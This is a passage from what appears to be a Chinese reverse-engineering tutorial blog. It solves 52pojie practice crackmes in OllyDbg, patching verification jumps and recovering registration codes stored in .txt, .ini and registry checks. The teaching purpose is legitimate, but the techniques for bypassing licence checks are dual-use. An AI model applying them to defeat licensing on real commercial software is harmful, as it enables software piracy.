class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">004027C0  |.  6A 00               push 0x0</span><br><span class="line">004027C2  |.  6A 00               push 0x0</span><br><span class="line">004027C4  |.  68 60465400         push 52PoJie?00544660                        ;  你选择的验证类型是重启验证1</span><br><span class="line">004027C9  |.  E8 B17F0000         call 52PoJie?0040A77F</span><br><span class="line">004027CE  |.  6A 00               push 0x0                                     ; /ExitCode = 0x0</span><br><span class="line">004027D0  |.  FF15 40385400       call dword ptr ds:[&lt;&amp;USER32.PostQuitMessage&gt;&gt;; \PostQuitMessage</span><br><span class="line">004027D6  |&gt;  56                  push esi                                     ; /hObject = 000000D4 (window)</span><br><span class="line">004027D7  |.  FF15 24345400       call dword ptr ds:[&lt;&amp;KERNEL32.CloseHandle&gt;]  ; \CloseHandle</span><br></pre></td></tr></table></figure><p>因为它是重启验证，所以在这个函数中找不到验证算法。而是在主程序出来前就已经运行验证算法了。再次打开程序时，程序会在相应的.txt，.ini或注册表里找注册码进行验证。</p><p>重载，找敏感字符串有关“52Pojie.txt”的双击进去反汇编代码，在函数开头下断。F9运行至断点处，F8路过这个函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00402AE2  |.  50            push eax                                 ; /Buffer = 00174B68</span><br><span class="line">00402AE3  |.  68 04010000   push 0x104                               ; |BufSize = 104 (260.)</span><br><span class="line">00402AE8  |.  FF15 14345400 call dword ptr ds:[&lt;&amp;KERNEL32.GetCurrent&gt;; \GetCurrentDirectoryA 获取当前目录</span><br></pre></td></tr></table></figure><p>继续F8，发现这个跳转跳过了“验证通过”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00402BC0  |.  E8 1BF4FFFF   call 52PoJie?00401FE0</span><br><span class="line">00402BC5  |.  85C0          test eax,eax</span><br><span class="line">00402BC7  |. /74 15         je short 52PoJie?00402BDE</span><br><span class="line">00402BC9  |. |8B8D DCFEFFFF mov ecx,[local.73]</span><br><span class="line">00402BCF  |. |68 18465400   push 52PoJie?00544618                    ;  验证通过</span><br><span class="line">00402BD4  |. |E8 E7980100   call 52PoJie?0041C4C0</span><br><span class="line">00402BD9  |. |BB 01000000   mov ebx,0x1</span><br><span class="line">00402BDE  |&gt; \8B85 E0FEFFFF mov eax,[local.72]</span><br></pre></td></tr></table></figure><p>如果是爆破的话，直接将跳转指令nop掉。保存，运行一下，成功。</p><img src="/posts/bb44dc0/nop.png" class="" title="验证1通过"><p>如果想逆向分析，跟进去第1行的call指令，那个就是算法函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00401FF7  |.  56            push esi                                 ; /hTemplateFile = 00174B68</span><br><span class="line">00401FF8  |.  56            push esi                                 ; |Attributes = ARCHIVE|TEMPORARY|COMPRESSED|174248</span><br><span class="line">00401FF9  |.  6A 03         push 0x3                                 ; |Mode = OPEN_EXISTING</span><br><span class="line">00401FFB  |.  56            push esi                                 ; |pSecurity = 00174B68</span><br><span class="line">00401FFC  |.  6A 01         push 0x1                                 ; |ShareMode = FILE_SHARE_READ</span><br><span class="line">00401FFE  |.  6A 01         push 0x1                                 ; |Access = 1</span><br><span class="line">00402000  |.  FFB1 BC000000 push dword ptr ds:[ecx+0xBC]             ; |FileName = &quot;C:\Documents and Settings\Administrator\桌面\吾爱破解培训第五课例子\52Pojie.txt&quot;</span><br><span class="line">00402006  |.  FF15 10345400 call dword ptr ds:[&lt;&amp;KERNEL32.CreateFile&gt;; \CreateFileA 创建或打开文件，这里是打开文件</span><br></pre></td></tr></table></figure><p>ReadFile函数，当程序运行到<code>00402046</code>时，Buffer指针指向文件内容首地址<code>0012F348</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00402039  |.  56            push esi                                 ; /pOverlapped = NULL</span><br><span class="line">0040203A  |.  50            push eax                                 ; |pBytesRead = 0012F348</span><br><span class="line">0040203B  |.  68 04010000   push 0x104                               ; |BytesToRead = 104 (260.)</span><br><span class="line">00402040  |.  8D85 F4FEFFFF lea eax,[local.67]                       ; |</span><br><span class="line">00402046  |.  50            push eax                                 ; |Buffer = 0012F348</span><br><span class="line">00402047  |.  57            push edi                                 ; |hFile = 000000AC (window)</span><br><span class="line">00402048  |.  FF15 28345400 call dword ptr ds:[&lt;&amp;KERNEL32.ReadFile&gt;] ; \ReadFile 读文件内容</span><br></pre></td></tr></table></figure><p>在信息窗口选中右键-&gt;数据窗口跟随，发现全是空数据，执行完这个函数时，<code>0012F348</code>出现我们输入的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">00402048  |.  FF15 28345400 call dword ptr ds:[&lt;&amp;KERNEL32.ReadFile&gt;] ; \ReadFile</span><br><span class="line">0040204E  |.  85C0          test eax,eax;返回值为1，表明文件不为空</span><br><span class="line">00402050  |.  74 3D         je short 52PoJie?0040208F</span><br><span class="line">00402052  |.  B9 24465400   mov ecx,52PoJie?00544624                 ;  JXU2MjExJXU2</span><br><span class="line">00402057  |.  8D85 F4FEFFFF lea eax,[local.67]</span><br><span class="line">0040205D  |.  8D49 00       lea ecx,dword ptr ds:[ecx]</span><br><span class="line">00402060  |&gt;  8A10          /mov dl,byte ptr ds:[eax];这个循环执行的是strcmp函数，比较eax和ecx是否相等。执行到这一句时，eax是我们输入的字符串，ecx是上面的注释JXU2MjExJXU2</span><br><span class="line">00402062  |.  3A11          |cmp dl,byte ptr ds:[ecx]</span><br><span class="line">00402064  |.  75 1A         |jnz short 52PoJie?00402080</span><br><span class="line">00402066  |.  84D2          |test dl,dl</span><br><span class="line">00402068  |.  74 12         |je short 52PoJie?0040207C</span><br><span class="line">0040206A  |.  8A50 01       |mov dl,byte ptr ds:[eax+0x1]</span><br><span class="line">0040206D  |.  3A51 01       |cmp dl,byte ptr ds:[ecx+0x1]</span><br><span class="line">00402070  |.  75 0E         |jnz short 52PoJie?00402080</span><br><span class="line">00402072  |.  83C0 02       |add eax,0x2</span><br><span class="line">00402075  |.  83C1 02       |add ecx,0x2</span><br><span class="line">00402078  |.  84D2          |test dl,dl</span><br><span class="line">0040207A  |.^ 75 E4         \jnz short 52PoJie?00402060</span><br><span class="line">0040207C  |&gt;  33C0          xor eax,eax</span><br></pre></td></tr></table></figure><p>所以很容易就知道重启验证1的注册码是<code>JXU2MjExJXU2</code>。将生成的.txt文件内容改为这个，再打开原程序发现验证通过。</p><p>验证2、3一样操作，但需要注意，一定要先生成一个配置文件或写入注册表再进行重启验证调试。验证1生成的.txt文件不影响验证2和验证3的调试，可以不删除。</p><p>验证2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00402C34  |.  E8 77F4FFFF   call 52PoJie?004020B0</span><br><span class="line">00402C39  |.  85C0          test eax,eax</span><br><span class="line">00402C3B  |.  74 11         je short 52PoJie?00402C4E</span><br><span class="line">00402C3D  |.  68 18465400   push 52PoJie?00544618                    ;  验证通过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040210C  |.  B9 40465400   mov ecx,52PoJie?00544640                 ;  NjJGJXU3NTI</span><br></pre></td></tr></table></figure><p>验证3：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00402CB2  |.  E8 B9F4FFFF   call 52PoJie?00402170</span><br><span class="line">00402CB7  |.  85C0          test eax,eax</span><br><span class="line">00402CB9  |.  74 37         je short 52PoJie?00402CF2</span><br><span class="line">00402CBB  |.  68 18465400   push 52PoJie?00544618                    ;  验证通过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004021FE  |.  B9 54465400   mov ecx,52PoJie?00544654                 ;  4JXU2MjM3</span><br></pre></td></tr></table></figure><p>细心一点就会在字符串列表发现这三个注册码</p><img src="/posts/bb44dc0/%E6%B3%A8%E5%86%8C%E7%A0%81.png" class="" title="注册码"><p>最后，重启验证的普通思路</p><ol><li><p>如果是写进.txt文件，一般都是这个步骤：</p><p>CreateFileA-&gt;WriteFile-&gt;ReadFile-&gt;比较算法</p></li><li><p>如果是写进.ini文件，一般都是这个步骤：</p><p>WritePrivateProfileStringA(写入配置信息)-&gt;GetPrivateProfileStringA(读取配置信息)</p></li><li><p>如果是写进注册表，一般都是这个步骤：</p><p>创建注册表Key:RegCreateKey-&gt;打开注册表Key:RegOpenKey-&gt;写入注册表键值:RegSetValueEx-&gt;查询注册表键值:RegQueryValue(Ex)</p></li></ol><p>三个都通过后，会出现一个彩蛋，输入字符串后，弹出消息框。</p><img src="/posts/bb44dc0/%E5%BD%A9%E8%9B%8B.png" class="" title="彩蛋"><p>输入不同字符串弹窗显示不同的内容。彩蛋很简单，其实就是把三个验证码拼接，Base64解码，UTF-8转换，得到“我是用户”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JXU2MjExJXU2NjJGJXU3NTI4JXU2MjM3</span><br><span class="line"></span><br><span class="line">Base64解码：</span><br><span class="line">%u6211%u662F%u7528%u6237</span><br><span class="line"></span><br><span class="line">Unicode转换：</span><br><span class="line">我是用户</span><br></pre></td></tr></table></figure><img src="/posts/bb44dc0/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2.png" class="" title="编码转换"><p>把三个验证码拼接，弹窗。</p><img src="/posts/bb44dc0/%E5%BD%A9%E8%9B%8B3.png" class="" title="彩蛋"><h1 id="4-重启验证作业"><a href="#4-重启验证作业" class="headerlink" title="4. 重启验证作业"></a>4. 重启验证作业</h1><p>输入假码没什么反应。</p><img src="/posts/bb44dc0/%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A.png" class="" title="课后作业"><p>拉去OD看看，搜索字符串，发现只有一个验证码<code>ITN3UXJGJ</code>显示。</p><img src="/posts/bb44dc0/%E6%90%9C%E7%B4%A2%E5%AD%97%E7%AC%A6%E4%B8%B22.png" class="" title="搜索字符串"><p>双击进去发现有<code>CreateFile</code>和<code>ReadFile</code>，所以判定这个是写入<code>.txt</code>文件的注册码。</p><img src="/posts/bb44dc0/txt%E6%96%87%E4%BB%B6.png" class="" title="txt文件"><p>用<code>GetPrivateProfileStringA</code>函数找到<code>.ini</code>文件的比较注册码算法。Ctrl+N，搜索<code>GetPrivateProfileStringA</code>右键-&gt;在每个参考上设置断点。或者在反汇编窗口右键-&gt;查找-&gt;所有模块间的调用，搜索函数，右键-&gt;在每个调用到<code>GetPrivateProfileStringA</code>上设置断点。一个一个断点点进去看，找到一个最像比较算法的(有循环、比较、跳转指令)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0040218F  |.  66:C785 F0FEF&gt;mov word ptr ss:[ebp-0x110],0x1A28       ; |</span><br><span class="line">00402198  |.  FF15 1C345400 call dword ptr ds:[&lt;&amp;KERNEL32.GetPrivate&gt;; \GetPrivateProfileStringA</span><br><span class="line">0040219E  |.  5E            pop esi                                  ;  kernel32.7C817077</span><br><span class="line">0040219F  |.  85C0          test eax,eax</span><br><span class="line">004021A1  |.  74 4D         je short 吾爱破解.004021F0</span><br><span class="line">004021A3  |.  8D8D F4FEFFFF lea ecx,[local.67]</span><br><span class="line">004021A9  |.  8D51 01       lea edx,dword ptr ds:[ecx+0x1]</span><br><span class="line">004021AC  |.  8D6424 00     lea esp,dword ptr ss:[esp]</span><br><span class="line">004021B0  |&gt;  8A01          /mov al,byte ptr ds:[ecx]    </span><br><span class="line">004021B2  |.  41            |inc ecx                       </span><br><span class="line">004021B3  |.  84C0          |test al,al</span><br><span class="line">004021B5  |.^ 75 F9         \jnz short 吾爱破解.004021B0</span><br><span class="line">004021B7  |.  2BCA          sub ecx,edx                              ;  ntdll.KiFastSystemCallRet</span><br><span class="line">004021B9  |.  83F9 0E       cmp ecx,0xE                   </span><br><span class="line">004021BC  |.  75 32         jnz short 吾爱破解.004021F0</span><br><span class="line">004021BE  |.  33C0          xor eax,eax                   </span><br><span class="line">004021C0  |&gt;  0FB69405 E4FE&gt;/movzx edx,byte ptr ss:[ebp+eax-0x11C]</span><br><span class="line">004021C8  |.  0FBE8C05 F4FE&gt;|movsx ecx,byte ptr ss:[ebp+eax-0x10C]</span><br><span class="line">004021D0  |.  83C2 30       |add edx,0x30                 </span><br><span class="line">004021D3  |.  3BD1          |cmp edx,ecx                   </span><br><span class="line">004021D5  |.  75 19         |jnz short 吾爱破解.004021F0</span><br><span class="line">004021D7  |.  40            |inc eax</span><br><span class="line">004021D8  |.  83F8 0E       |cmp eax,0xE</span><br><span class="line">004021DB  |.^ 72 E3         \jb short 吾爱破解.004021C0</span><br></pre></td></tr></table></figure><p>由于这个断点程序没有被经过，很难分析它的算法(我目前能力有限)。要想经过这段算法，就要看一下我们输入字符串后，程序怎么运行的。反汇编窗口右键-&gt;查找-&gt;所有模块间的调用，搜索<code>GetWindowTextA</code>，在每个调用到<code>GetWindowTextA</code>上设置断点。输入字符串后运行，程序停在某断点处。养成好习惯，把其它的<code>GetWindowTextA</code>断点取消。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0041837E  |.  FF15 2C365400 call dword ptr ds:[&lt;&amp;USER32.GetWindowTex&gt;; \GetWindowTextA</span><br><span class="line">00418384  |.  8B4D 08       mov ecx,[arg.1]</span><br><span class="line">00418387  |.  6A FF         push -0x1</span><br><span class="line">00418389  |.  E8 AEFEFEFF   call 吾爱破解.0040823C</span><br><span class="line">0041838E  |.  5E            pop esi                                  ;  00940796</span><br><span class="line">0041838F  |.  5D            pop ebp                                  ;  00940796</span><br><span class="line">00418390  |.  C2 0400       retn 0x4</span><br></pre></td></tr></table></figure><p>返回上一级函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">004029D3  |.  E8 7F590100   call 吾爱破解.00418357                       ;  GetWindowTextA函数所在</span><br><span class="line">004029D8  |.  8B4D EC       mov ecx,[local.5]                        ;  字符串存进ecx</span><br><span class="line">004029DB  |.  8B79 F4       mov edi,dword ptr ds:[ecx-0xC]           ;  字符串长度存进edi</span><br><span class="line">004029DE  |.  85FF          test edi,edi</span><br><span class="line">004029E0  |.  74 1A         je short 吾爱破解.004029FC                   ;  字符串长度为0跳转</span><br><span class="line">004029E2  |.  33D2          xor edx,edx                              ;  edx清零</span><br><span class="line">004029E4  |.  85FF          test edi,edi</span><br><span class="line">004029E6  |.  7E 14         jle short 吾爱破解.004029FC                  ;  字符串长度小于等于0跳转</span><br><span class="line">004029E8  |&gt;  85D2          /test edx,edx</span><br><span class="line">004029EA  |.  78 36         |js short 吾爱破解.00402A22                  ;  结果为负跳转</span><br><span class="line">004029EC  |.  3BD7          |cmp edx,edi</span><br><span class="line">004029EE  |.  7F 32         |jg short 吾爱破解.00402A22                  ;  大于跳转</span><br><span class="line">004029F0  |.  803C0A 2D     |cmp byte ptr ds:[edx+ecx],0x2D          ;  判断字符是否是“-”</span><br><span class="line">004029F4  |.  75 01         |jnz short 吾爱破解.004029F7                 ;  不是指向下一个字符</span><br><span class="line">004029F6  |.  46            |inc esi                                 ;  是就+1</span><br><span class="line">004029F7  |&gt;  42            |inc edx</span><br><span class="line">004029F8  |.  3BD7          |cmp edx,edi</span><br><span class="line">004029FA  |.^ 7C EC         \jl short 吾爱破解.004029E8                  ;  遍历完字符串退出循环</span><br><span class="line">004029FC  |&gt;  C1E6 04       shl esi,0x4</span><br><span class="line">004029FF  |.  83EE 02       sub esi,0x2</span><br><span class="line">00402A02  |.  B8 CDCCCCCC   mov eax,0xCCCCCCCD</span><br><span class="line">00402A07  |.  F7E6          mul esi</span><br><span class="line">;执行完这条指令后edx的值被覆盖，所以下面的0x18不能看作是字符串长度，字符串长度存储在edi里</span><br><span class="line">00402A09  |.  C1EA 03       shr edx,0x3                              ;  根据edx右移3位后要等于3，所以3左移3位等于0x18</span><br><span class="line">00402A0C  |.  BE FFFFFFFF   mov esi,-0x1                  </span><br><span class="line">00402A11  |.  83EA 03       sub edx,0x3                              ;  根据下面跳转判断edx=3</span><br><span class="line">00402A14  |.  0F85 C8020000 jnz 吾爱破解.00402CE2                        ;  不为0跳转，这里跳转绕过注册成功</span><br><span class="line">00402A1A  |.  85FF          test edi,edi</span><br><span class="line">00402A1C  |.  7F 0E         jg short 吾爱破解.00402A2C</span><br><span class="line">00402A1E  |.  0BF6          or esi,esi</span><br><span class="line">00402A20  |.  EB 23         jmp short 吾爱破解.00402A45</span><br><span class="line">00402A22  |&gt;  68 57000780   push 0x80070057</span><br><span class="line">00402A27  |.  E8 C4E9FFFF   call 吾爱破解.004013F0</span><br><span class="line">00402A2C  |&gt;  6A 2D         push 0x2D</span><br><span class="line">00402A2E  |.  51            push ecx</span><br><span class="line">00402A2F  |.  E8 D4921100   call 吾爱破解.0051BD08</span><br></pre></td></tr></table></figure><p>进一步分析这几条指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">004029FC  |&gt; \C1E6 04       shl esi,0x4                              ;  从下面逆推0x20右移4位为2，所以“-”的个数为2</span><br><span class="line">004029FF  |.  83EE 02       sub esi,0x2                              ;  要使下面的edx=0x18,这里esi=0x1E+2=0x20才对</span><br><span class="line"> ;  esi=18 66666666除以CCCCCCCD=0X1E</span><br><span class="line">00402A02  |.  B8 CDCCCCCC   mov eax,0xCCCCCCCD                       ;  eax=CCCCCCCD</span><br><span class="line">00402A07  |.  F7E6          mul esi                                  ;  edx拼接eax=esi*eax要等于00000018 66666666</span><br><span class="line">00402A09  |.  C1EA 03       shr edx,0x3                              ;  根据edx右移3位后要等于3，所以3左移3位等于0x18</span><br></pre></td></tr></table></figure><p>懂了，所以字符串中需要两个“-”号。输入<code>1234567-89012345-6789012</code>试试(“-”号位置任意)。</p><img src="/posts/bb44dc0/-.png" class="" title="输入字符串"><p>发现注册成功。注册成功后会在目录下生成.txt，.ini文件，写入注册表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">52pojie.txt</span><br><span class="line">1234567</span><br><span class="line"></span><br><span class="line">52pojie.ini</span><br><span class="line">[验证]</span><br><span class="line">Key=89012345</span><br><span class="line"></span><br><span class="line">注册表</span><br><span class="line">6789012</span><br></pre></td></tr></table></figure><p>从上面的分析中已经知道.txt文件的注册码是<code>ITN3UXJGJ</code>，改了再说，这里是9个字符。这时再下断<code>GetPrivateProfileStringA</code>函数，程序就会经过这个算法。此时就可以分析算法了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">00402198  |.  FF15 1C345400 call dword ptr ds:[&lt;&amp;KERNEL32.GetPrivate&gt;; \GetPrivateProfileStringA</span><br><span class="line">0040219E  |.  5E            pop esi</span><br><span class="line">0040219F  |.  85C0          test eax,eax                             ;  ini文件的字符串长度</span><br><span class="line">004021A1  |.  74 4D         je short 吾爱破解.004021F0                   ;  字符串长度为0跳转</span><br><span class="line">004021A3  |.  8D8D F4FEFFFF lea ecx,[local.67]                       ;  ecx等于字符串</span><br><span class="line">004021A9  |.  8D51 01       lea edx,dword ptr ds:[ecx+0x1]</span><br><span class="line">004021AC  |.  8D6424 00     lea esp,dword ptr ss:[esp]</span><br><span class="line">004021B0  |&gt;  8A01          /mov al,byte ptr ds:[ecx]</span><br><span class="line">004021B2  |.  41            |inc ecx                                 ;  指针+1指向下个字符</span><br><span class="line">004021B3  |.  84C0          |test al,al</span><br><span class="line">004021B5  |.^ 75 F9         \jnz short 吾爱破解.004021B0                 ;  遍历字符串</span><br><span class="line">004021B7  |.  2BCA          sub ecx,edx                              ;  ecx存进字符串长度</span><br><span class="line">004021B9  |.  83F9 0E       cmp ecx,0xE                              ;  ini文件中字符串长度为14</span><br><span class="line">004021BC  |.  75 32         jnz short 吾爱破解.004021F0</span><br><span class="line">004021BE  |.  33C0          xor eax,eax                              ;  eax清零</span><br><span class="line">004021C0  |&gt;  0FB69405 E4FE&gt;/movzx edx,byte ptr ss:[ebp+eax-0x11C]   ;  将真正的注册码存入edx</span><br><span class="line">004021C8  |.  0FBE8C05 F4FE&gt;|movsx ecx,byte ptr ss:[ebp+eax-0x10C]   ;  将输入的字符串存入ecx</span><br><span class="line">004021D0  |.  83C2 30       |add edx,0x30                            ;  将真正的注册码+0x30</span><br><span class="line">004021D3  |.  3BD1          |cmp edx,ecx                             ;  与输入的字符串对比</span><br><span class="line">004021D5  |.  75 19         |jnz short 吾爱破解.004021F0</span><br><span class="line">004021D7  |.  40            |inc eax</span><br><span class="line">004021D8  |.  83F8 0E       |cmp eax,0xE</span><br><span class="line">004021DB  |.^ 72 E3         \jb short 吾爱破解.004021C0</span><br></pre></td></tr></table></figure><p>在数据窗口Ctrl+G输入<code>ebp+eax-0x11c</code>，第1行就是真正的注册码，第2行是输入的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0012F33C  3A 1E 02 25 28 1A 48 15 3A 1D 02 25 28 1A 00 00  :%(H:%(..</span><br><span class="line">0012F34C  38 39 30 31 34 35 36 37 38 39 30 31 32 31 00 00  89014567890121..</span><br></pre></td></tr></table></figure><p>将真正的注册码+0x30就是我们要输入的字符串<code>jN2UXJxEjM2UXJ</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6A 4E 32 55 58 4A 78 45 6A 4D 32 55 58 4A</span><br></pre></td></tr></table></figure><p>将目录下的.ini文件信息修改为以上字符串。</p><p>注册表部分。在反汇编窗口右键-&gt;查找-&gt;所有模块间的调用，搜索<code>RegQueryValueExA</code>函数，右键-&gt;在每个调用到<code>RegQueryValueExA</code>上设置断点。找到有比较算法那个，分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00402285  |.  FF15 24305400 call dword ptr ds:[&lt;&amp;ADVAPI32.RegQueryVa&gt;; \RegQueryValueExA</span><br><span class="line">0040228B  |.  85C0          test eax,eax</span><br><span class="line">0040228D  |.  0F85 E1000000 jnz 吾爱破解.00402374</span><br><span class="line">00402293  |.  8D8D F4FEFFFF lea ecx,[local.67]                       ;  输入的字符串</span><br><span class="line">00402299  |.  8D51 01       lea edx,dword ptr ds:[ecx+0x1]</span><br><span class="line">0040229C  |.  8D6424 00     lea esp,dword ptr ss:[esp]</span><br><span class="line">004022A0  |&gt;  8A01          /mov al,byte ptr ds:[ecx]</span><br><span class="line">004022A2  |.  41            |inc ecx</span><br><span class="line">004022A3  |.  84C0          |test al,al</span><br><span class="line">004022A5  |.^ 75 F9         \jnz short 吾爱破解.004022A0                 ;  遍历字符串</span><br><span class="line">004022A7  |.  2BCA          sub ecx,edx                              ;  ecx=字符串长度=9</span><br><span class="line">004022A9  |.  83C1 06       add ecx,0x6                              ;  所以ecx=字符串长度+6=0xF</span><br><span class="line">004022AC  |.  B8 CDCCCCCC   mov eax,0xCCCCCCCD                       ;  eax=CCCCCCCD</span><br><span class="line">004022B1  |.  F7E1          mul ecx                                  ;  要使得edx拼接eax=ecx*eax=C 33333336</span><br><span class="line">004022B3  |.  C1EA 02       shr edx,0x2                              ;  edx=0x0C</span><br><span class="line">004022B6  |.  83EA 03       sub edx,0x3                              ;  edx=0x3</span><br><span class="line">004022B9  |.  0F85 B5000000 jnz 吾爱破解.00402374                        ;  退出函数，不能跳</span><br><span class="line">004022BF  |.  E8 D82D0000       call 吾爱破解.0040509C</span><br></pre></td></tr></table></figure><p>所以注册表的注册码是9个字符，修改修改再继续。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">004022BF  |.  E8 D82D0000       call 吾爱破解.0040509C                       ;  mov eax=lJT</span><br><span class="line">004022C4  |.  8BC8              mov ecx,eax</span><br><span class="line">004022C6  |.  85C9              test ecx,ecx</span><br><span class="line">004022C8  |.  0F84 C3000000     je 吾爱破解.00402391</span><br><span class="line">004022CE  |.  8B01              mov eax,dword ptr ds:[ecx]               ;  eax=lJT.</span><br><span class="line">004022D0  |.  FF50 0C           call dword ptr ds:[eax+0xC]              ;  eax指向地址58E5E0,也就是lJT.的下一地址</span><br><span class="line">004022D3  |.  8A95 F8FEFFFF     mov dl,byte ptr ss:[ebp-0x108]           ;  dl指向输入的字符第五个字符的地址</span><br><span class="line">004022D9  |.  8D70 10           lea esi,dword ptr ds:[eax+0x10]          ;  esi=58e5f0</span><br><span class="line">004022DC  |.  0FBE85 F4FEFFFF   movsx eax,byte ptr ss:[ebp-0x10C]        ;  eax=字符串的第1个字符</span><br><span class="line">004022E3  |.  0FBECA            movsx ecx,dl                             ;  ecx=字符串的第5个字符</span><br><span class="line">004022E6  |.  48                dec eax                                  ;  eax=eax-1</span><br><span class="line">004022E7  |.  89B5 E4FEFFFF     mov [local.71],esi                       ;  吾爱破解.0058E5F0</span><br><span class="line">004022ED  |.  3BC1              cmp 